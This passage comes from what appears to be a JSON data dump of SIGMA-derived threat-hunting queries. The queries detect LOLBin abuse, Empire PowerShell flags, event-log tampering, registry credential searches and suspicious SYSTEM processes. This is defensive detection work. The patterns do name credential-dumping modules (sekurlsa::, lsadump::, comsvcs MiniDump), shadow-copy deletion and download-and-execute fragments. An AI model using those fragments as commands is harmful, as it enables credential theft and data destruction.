tgt.process.cmdline contains \"ShOpenVerbShortcut\") or (tgt.process.cmdline contains \"scrobj.dll\" and tgt.process.cmdline contains \"GenerateTypeLib\" and tgt.process.cmdline contains \"http\") or (tgt.process.cmdline contains \"shimgvw.dll\" and tgt.process.cmdline contains \"ImageView_Fullscreen\" and tgt.process.cmdline contains \"http\") or (tgt.process.cmdline contains \"comsvcs.dll\" and tgt.process.cmdline contains \"MiniDump\")) and (not (tgt.process.cmdline contains \"shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver\" or (src.process.image.path=\"C:\\Windows\\System32\\control.exe\" and src.process.cmdline contains \".cpl\" and (tgt.process.cmdline contains \"Shell32.dll\" and tgt.process.cmdline contains \"Control_RunDLL\" and tgt.process.cmdline contains \".cpl\")) or (src.process.image.path=\"C:\\Windows\\System32\\control.exe\" and tgt.process.cmdline contains \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" Shell32.dll,Control_RunDLL \\\"C:\\Windows\\System32\\\" and tgt.process.cmdline contains \".cpl\\\",\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 491
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "System File Execution Location Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\atbroker.exe\" or tgt.process.image.path contains \"\\audiodg.exe\" or tgt.process.image.path contains \"\\bcdedit.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certreq.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmstp.exe\" or tgt.process.image.path contains \"\\conhost.exe\" or tgt.process.image.path contains \"\\consent.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\csrss.exe\" or tgt.process.image.path contains \"\\dashost.exe\" or tgt.process.image.path contains \"\\defrag.exe\" or tgt.process.image.path contains \"\\dfrgui.exe\" or tgt.process.image.path contains \"\\dism.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\dllhst3g.exe\" or tgt.process.image.path contains \"\\dwm.exe\" or tgt.process.image.path contains \"\\eventvwr.exe\" or tgt.process.image.path contains \"\\logonui.exe\" or tgt.process.image.path contains \"\\LsaIso.exe\" or tgt.process.image.path contains \"\\lsass.exe\" or tgt.process.image.path contains \"\\lsm.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\ntoskrnl.exe\" or tgt.process.image.path contains \"\\powershell_ise.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\runonce.exe\" or tgt.process.image.path contains \"\\RuntimeBroker.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\services.exe\" or tgt.process.image.path contains \"\\sihost.exe\" or tgt.process.image.path contains \"\\smartscreen.exe\" or tgt.process.image.path contains \"\\smss.exe\" or tgt.process.image.path contains \"\\spoolsv.exe\" or tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\taskhost.exe\" or tgt.process.image.path contains \"\\Taskmgr.exe\" or tgt.process.image.path contains \"\\userinit.exe\" or tgt.process.image.path contains \"\\wininit.exe\" or tgt.process.image.path contains \"\\winlogon.exe\" or tgt.process.image.path contains \"\\winver.exe\" or tgt.process.image.path contains \"\\wlanext.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\wsmprovhost.exe\") and (not ((tgt.process.image.path contains \"C:\\$WINDOWS.~BT\\\" or tgt.process.image.path contains \"C:\\$WinREAgent\\\" or tgt.process.image.path contains \"C:\\Windows\\SoftwareDistribution\\\" or tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SystemTemp\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\" or tgt.process.image.path contains \"C:\\Windows\\uus\\\" or tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\") or (tgt.process.image.path in (\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\",\"C:\\Program Files\\PowerShell\\7-preview\\pwsh.exe\")) or (tgt.process.image.path contains \"C:\\Program Files\\WindowsApps\\MicrosoftCorporationII.WindowsSubsystemForLinux\" and tgt.process.image.path contains \"\\wsl.exe\"))) and (not tgt.process.image.path contains \"\\SystemRoot\\System32\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 492
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious powershell command line parameters used in Empire",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "HackTool - Empire PowerShell Launch Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -NoP -sta -NonI -W Hidden -Enc \" or tgt.process.cmdline contains \" -noP -sta -w 1 -enc \" or tgt.process.cmdline contains \" -NoP -NonI -W Hidden -enc \" or tgt.process.cmdline contains \" -noP -sta -w 1 -enc\" or tgt.process.cmdline contains \" -enc  SQB\" or tgt.process.cmdline contains \" -nop -exec bypass -EncodedCommand \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 493
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of SharpEvtHook, a tool that tampers with the Windows event logs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "HackTool - SharpEvtMute Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SharpEvtMute.exe\" or tgt.process.displayName=\"SharpEvtMute\" or (tgt.process.cmdline contains \"--Filter \\\"rule \" or tgt.process.cmdline contains \"--Encoded --Filter \\\\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 494
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious child process of a Microsoft HTML Help (HH.exe)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1059",
                "t1059",
                "t1059",
                "t1059",
                "t1218",
                "t1218",
                "t1218",
                "t1218",
                "t1566",
                "t1566"
            ],
            "name": "HTML Help HH.EXE Suspicious Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\hh.exe\" and (tgt.process.image.path contains \"\\CertReq.exe\" or tgt.process.image.path contains \"\\CertUtil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\installutil.exe\" or tgt.process.image.path contains \"\\MSbuild.exe\" or tgt.process.image.path contains \"\\MSHTA.EXE\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 495
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053",
                "t1059"
            ],
            "name": "Suspicious Schtasks Execution AppData Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/Create\" and tgt.process.cmdline contains \"/RU\" and tgt.process.cmdline contains \"/TR\" and tgt.process.cmdline contains \"C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\\") and (tgt.process.cmdline contains \"NT AUT\" or tgt.process.cmdline contains \" SYSTEM \")) and (not ((src.process.image.path contains \"\\AppData\\Local\\Temp\\\" and src.process.image.path contains \"TeamViewer_.exe\") and tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/TN TVInstallRestore\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 496
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140",
                "t1059"
            ],
            "name": "PowerShell Base64 Encoded FromBase64String Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"OjpGcm9tQmFzZTY0U3RyaW5n\" or tgt.process.cmdline contains \"o6RnJvbUJhc2U2NFN0cmluZ\" or tgt.process.cmdline contains \"6OkZyb21CYXNlNjRTdHJpbm\" or (tgt.process.cmdline contains \"OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA\" or tgt.process.cmdline contains \"oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA\" or tgt.process.cmdline contains \"6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 497
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials.\nThe Windows Registry stores configuration information that can be used by the system or other programs.\nAdversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "Enumeration for Credentials in Registry",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \" query \" and tgt.process.cmdline contains \"/t \" and tgt.process.cmdline contains \"REG_SZ\" and tgt.process.cmdline contains \"/s\")) and ((tgt.process.cmdline contains \"/f \" and tgt.process.cmdline contains \"HKLM\") or (tgt.process.cmdline contains \"/f \" and tgt.process.cmdline contains \"HKCU\") or tgt.process.cmdline contains \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 498
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of electron apps (teams, discord, slack, etc.). This could be a potential sign of \".asar\" file tampering (See reference section for more information) or binary execution proxy through specific CLI arguments (see related rule)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Electron Application Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\chrome.exe\" or src.process.image.path contains \"\\discord.exe\" or src.process.image.path contains \"\\GitHubDesktop.exe\" or src.process.image.path contains \"\\keybase.exe\" or src.process.image.path contains \"\\msedge.exe\" or src.process.image.path contains \"\\msedgewebview2.exe\" or src.process.image.path contains \"\\msteams.exe\" or src.process.image.path contains \"\\slack.exe\" or src.process.image.path contains \"\\teams.exe\") and ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \":\\ProgramData\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"\\Users\\Public\\\" or tgt.process.image.path contains \"\\Windows\\Temp\\\")) and (not (src.process.image.path contains \"\\Discord.exe\" and tgt.process.image.path contains \"\\cmd.exe\" and tgt.process.cmdline contains \"\\NVSMI\\nvidia-smi.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 499
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Replace.exe which can be used to replace file with another file",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Replace.exe Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\replace.exe\" and (tgt.process.cmdline contains \"-a\" or tgt.process.cmdline contains \"/a\" or tgt.process.cmdline contains \"\u2013a\" or tgt.process.cmdline contains \"\u2014a\" or tgt.process.cmdline contains \"\u2015a\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 500
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect execution of suspicious double extension files in ParentCommandLine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Parent Double Extension File Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \".doc.lnk\" or src.process.image.path contains \".docx.lnk\" or src.process.image.path contains \".xls.lnk\" or src.process.image.path contains \".xlsx.lnk\" or src.process.image.path contains \".ppt.lnk\" or src.process.image.path contains \".pptx.lnk\" or src.process.image.path contains \".rtf.lnk\" or src.process.image.path contains \".pdf.lnk\" or src.process.image.path contains \".txt.lnk\" or src.process.image.path contains \".doc.js\" or src.process.image.path contains \".docx.js\" or src.process.image.path contains \".xls.js\" or src.process.image.path contains \".xlsx.js\" or src.process.image.path contains \".ppt.js\" or src.process.image.path contains \".pptx.js\" or src.process.image.path contains \".rtf.js\" or src.process.image.path contains \".pdf.js\" or src.process.image.path contains \".txt.js\") or (src.process.cmdline contains \".doc.lnk\" or src.process.cmdline contains \".docx.lnk\" or src.process.cmdline contains \".xls.lnk\" or src.process.cmdline contains \".xlsx.lnk\" or src.process.cmdline contains \".ppt.lnk\" or src.process.cmdline contains \".pptx.lnk\" or src.process.cmdline contains \".rtf.lnk\" or src.process.cmdline contains \".pdf.lnk\" or src.process.cmdline contains \".txt.lnk\" or src.process.cmdline contains \".doc.js\" or src.process.cmdline contains \".docx.js\" or src.process.cmdline contains \".xls.js\" or src.process.cmdline contains \".xlsx.js\" or src.process.cmdline contains \".ppt.js\" or src.process.cmdline contains \".pptx.js\" or src.process.cmdline contains \".rtf.js\" or src.process.cmdline contains \".pdf.js\" or src.process.cmdline contains \".txt.js\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 501
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of \"query.exe\" a system binary to exfil information such as \"sessions\" and \"processes\" for later use",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Query Usage To Exfil Data",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \":\\Windows\\System32\\query.exe\" and (tgt.process.cmdline contains \"session >\" or tgt.process.cmdline contains \"process >\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 502
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1134",
                "t1003",
                "t1027"
            ],
            "name": "Suspicious SYSTEM User Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.integrityLevel in (\"System\",\"S-1-16-16384\")) and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\")) and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.cmdline contains \" -NoP \" or tgt.process.cmdline contains \" -W Hidden \" or tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" /decode \" or tgt.process.cmdline contains \" /urlcache \" or tgt.process.cmdline contains \" -urlcache \" or tgt.process.cmdline=\"* -e* JAB*\" or tgt.process.cmdline=\"* -e* SUVYI*\" or tgt.process.cmdline=\"* -e* SQBFAFgA*\" or tgt.process.cmdline=\"* -e* aWV4I*\" or tgt.process.cmdline=\"* -e* IAB*\" or tgt.process.cmdline=\"* -e* PAA*\" or tgt.process.cmdline=\"* -e* aQBlAHgA*\" or tgt.process.cmdline contains \"vssadmin delete shadows\" or tgt.process.cmdline contains \"reg SAVE HKLM\" or tgt.process.cmdline contains \" -ma \" or tgt.process.cmdline contains \"Microsoft\\Windows\\CurrentVersion\\Run\" or tgt.process.cmdline contains \".downloadstring(\" or tgt.process.cmdline contains \".downloadfile(\" or tgt.process.cmdline contains \" /ticket:\" or tgt.process.cmdline contains \"dpapi::\" or tgt.process.cmdline contains \"event::clear\" or tgt.process.cmdline contains \"event::drop\" or tgt.process.cmdline contains \"id::modify\" or tgt.process.cmdline contains \"kerberos::\" or tgt.process.cmdline contains \"lsadump::\" or tgt.process.cmdline contains \"misc::\" or tgt.process.cmdline contains \"privilege::\" or tgt.process.cmdline contains \"rpc::\" or tgt.process.cmdline contains \"sekurlsa::\" or tgt.process.cmdline contains \"sid::\" or tgt.process.cmdline contains \"token::\" or tgt.process.cmdline contains \"vault::cred\" or tgt.process.cmdline contains \"vault::list\" or tgt.process.cmdline contains \" p::d \" or tgt.process.cmdline contains \";iex(\" or tgt.process.cmdline contains \"MiniDump\" or tgt.process.cmdline contains \"net user \"))) and (not ((tgt.process.cmdline contains \"ping\" and tgt.process.cmdline contains \"127.0.0.1\" and tgt.process.cmdline contains \" 